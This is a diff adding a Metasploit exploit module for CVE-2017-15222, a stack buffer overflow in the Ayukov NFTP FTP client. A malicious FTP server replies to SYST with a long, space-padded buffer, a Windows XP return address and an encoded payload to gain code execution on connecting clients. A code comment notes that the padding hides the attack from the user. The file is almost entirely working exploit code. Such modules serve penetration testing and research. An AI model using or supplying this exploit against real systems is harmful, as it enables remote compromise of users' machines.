@@ -1,0 +1,108 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = NormalRanking
+
+  include Msf::Exploit::Remote::TcpServer
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Ayukov NFTP FTP Client Buffer Overflow',
+      'Description'    => %q{
+          This module exploits a stack-based buffer overflow vulnerability against Ayukov NFTPD FTP
+          Client 2.0 and earlier. By responding with a long string of data for the SYST request, it
+          is possible to cause a denail-of-service condition on the FTP client, or arbitrary remote
+          code exeuction under the context of the user if successfully exploited.
+      },
+      'Author'   =>
+        [
+          'Berk Cem Goksel',  # Original exploit author
+          'Daniel Teixeira',  # MSF module author
+          'sinn3r'            # RCA, improved module reliability and user exp
+        ],
+      'License'        => MSF_LICENSE,
+      'References'     =>
+        [
+          [ 'CVE', '2017-15222'],
+          [ 'EDB', '43025' ],
+        ],
+      'Payload'        =>
+        {
+          'BadChars' => "\x00\x01\x0a\x10\x0d",
+          'StackAdjustment' => -3500
+        },
+      'Platform'       => 'win',
+      'Targets'        =>
+        [
+    [ 'Windows XP Pro SP3 English', { 'Ret' => 0x77f31d2f } ], # GDI32.dll v5.1.2600.5512
+        ],
+      'Privileged'     => false,
+      'DefaultOptions' =>
+        {
+      'SRVHOST' => '0.0.0.0',
+        },
+      'DisclosureDate' => 'Oct 21 2017',
+      'DefaultTarget'  => 0))
+
+    register_options(
+      [
+        OptPort.new('SRVPORT', [ true, "The FTP port to listen on", 21 ]),
+      ])
+  end
+
+  def exploit
+    srv_ip_for_client = datastore['SRVHOST']
+    if srv_ip_for_client == '0.0.0.0'
+      if datastore['LHOST']
+        srv_ip_for_client = datastore['LHOST']
+      else
+        srv_ip_for_client = Rex::Socket.source_address('50.50.50.50')
+      end
+    end
+
+    srv_port = datastore['SRVPORT']
+
+    print_status("Please ask your target(s) to connect to #{srv_ip_for_client}:#{srv_port}")
+    super
+  end
+
+  def on_client_connect(client)
+    return if ((p = regenerate_payload(client)) == nil)
+    print_status("#{client.peerhost} - connected")
+
+    # Let the client log in
+    client.get_once
+
+    print_status("#{client.peerhost} - sending 331 OK")
+    user = "331 OK.\r\n"
+    client.put(user)
+
+    client.get_once
+    print_status("#{client.peerhost} - sending 230 OK")
+    pass = "230 OK.\r\n"
+    client.put(pass)
+
+    # It is important to use 0x20 (space) as the first chunk of the buffer, because this chunk
+    # is visible from the user's command prompt, which would make the buffer overflow attack too
+    # obvious.
+    sploit = "\x20"*4116
+
+    sploit << [target.ret].pack('V')
+    sploit << make_nops(10)
+    sploit << payload.encoded
+    sploit << Rex::Text.rand_text(15000 - 4116 - 4 - 16 - payload.encoded.length, payload_badchars)
+    sploit << "\r\n"
+
+    print_status("#{client.peerhost} - sending the malicious response")
+    client.put(sploit)
+
+    client.get_once
+    pwd = "257\r\n"
+    client.put(pwd)
+    client.get_once
+
+  end
+end
